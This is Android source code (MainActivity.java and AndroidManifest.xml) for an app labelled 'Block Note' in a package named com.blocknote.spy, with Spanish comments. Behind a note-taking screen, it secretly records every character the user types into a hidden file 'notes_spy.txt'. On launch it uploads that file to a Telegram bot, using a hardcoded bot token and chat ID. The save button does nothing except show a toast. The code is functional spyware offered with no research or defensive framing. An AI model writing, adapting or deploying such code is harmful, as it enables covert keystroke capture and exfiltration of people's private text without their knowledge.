/* MainActivity.java */ package com.blocknote.spy;

import android.Manifest; import android.content.pm.PackageManager; import android.os.Bundle; import android.os.Environment; import android.text.Editable; import android.text.TextWatcher; import android.util.Log; import android.view.View; import android.widget.Button; import android.widget.EditText; import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity; import androidx.core.app.ActivityCompat; import androidx.core.content.ContextCompat;

import java.io.File; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.IOException; import java.io.OutputStream; import java.io.OutputStreamWriter; import java.io.PrintWriter; import java.net.HttpURLConnection; import java.net.URL;

public class MainActivity extends AppCompatActivity {

private EditText noteTitle, noteContent;
private Button saveButton;
private File logFile;

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);

    noteTitle = findViewById(R.id.noteTitle);
    noteContent = findViewById(R.id.noteContent);
    saveButton = findViewById(R.id.saveButton);

    // Crear archivo de log oculto
    File dir = getExternalFilesDir(null);
    logFile = new File(dir, "notes_spy.txt");

    noteContent.addTextChangedListener(new TextWatcher() {
        @Override
        public void beforeTextChanged(CharSequence s, int start, int count, int after) {}

        @Override
        public void onTextChanged(CharSequence s, int start, int before, int count) {
            if (count > 0) {
                try (FileOutputStream fos = new FileOutputStream(logFile, true)) {
                    fos.write((s.subSequence(start, start + count) + "").getBytes());
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }

        @Override
        public void afterTextChanged(Editable s) {}
    });

    saveButton.setOnClickListener(new View.OnClickListener() {
        @Override
        public void onClick(View v) {
            Toast.makeText(MainActivity.this, "Nota guardada", Toast.LENGTH_SHORT).show();
        }
    });

    checkPermissions();
    enviarArchivoATelegram();
}

private void checkPermissions() {
    if (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
        ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE}, 1);
    }
}

private void enviarArchivoATelegram() {
    new Thread(() -> {
        try {
            File fileToSend = logFile;
            String boundary = "===" + System.currentTimeMillis() + "===";
            String LINE_FEED = "\r\n";
            URL url = new URL("https://api.telegram.org/bot8109221012:AAEenREaGw11aLIJSURaY7As8SNN8Q7SGeo/sendDocument");

            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setUseCaches(false);
            conn.setDoOutput(true);
            conn.setDoInput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

            OutputStream outputStream = conn.getOutputStream();
            PrintWriter writer = new PrintWriter(new OutputStreamWriter(outputStream, "UTF-8"), true);

            // Agregar el chat_id
            writer.append("--" + boundary).append(LINE_FEED);
            writer.append("Content-Disposition: form-data; name=\"chat_id\"").append(LINE_FEED);
            writer.append(LINE_FEED).append("7871137931").append(LINE_FEED);
            writer.flush();

            // Agregar el archivo
            writer.append("--" + boundary).append(LINE_FEED);
            writer.append("Content-Disposition: form-data; name=\"document\"; filename=\"" + fileToSend.getName() + "\"").append(LINE_FEED);
            writer.append("Content-Type: text/plain").append(LINE_FEED);
            writer.append(LINE_FEED);
            writer.flush();

            FileInputStream inputStream = new FileInputStream(fileToSend);
            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = inputStream.read(buffer)) != -1) {
                outputStream.write(buffer, 0, bytesRead);
            }
            outputStream.flush();
            inputStream.close();

            writer.append(LINE_FEED).flush();
            writer.append("--" + boundary + "--").append(LINE_FEED);
            writer.close();

            int responseCode = conn.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                Log.d("Telegram", "Archivo enviado correctamente");
            } else {
                Log.e("Telegram", "Error al enviar archivo: " + responseCode);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }).start();
}

}

/* AndroidManifest.xml */ <manifest xmlns:android="http://schemas.android.com/apk/res/android"
package="com.blocknote.spy">

<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
<uses-permission android:name="android.permission.INTERNET" />

<application
    android:allowBackup="true"
    android:label="Block Note"
    android:icon="@mipmap/ic_launcher"
    android:theme="@style/Theme.AppCompat.DayNight.DarkActionBar">

    <activity android:name=".MainActivity">
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />
            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
    </activity>

</application>

</manifest>
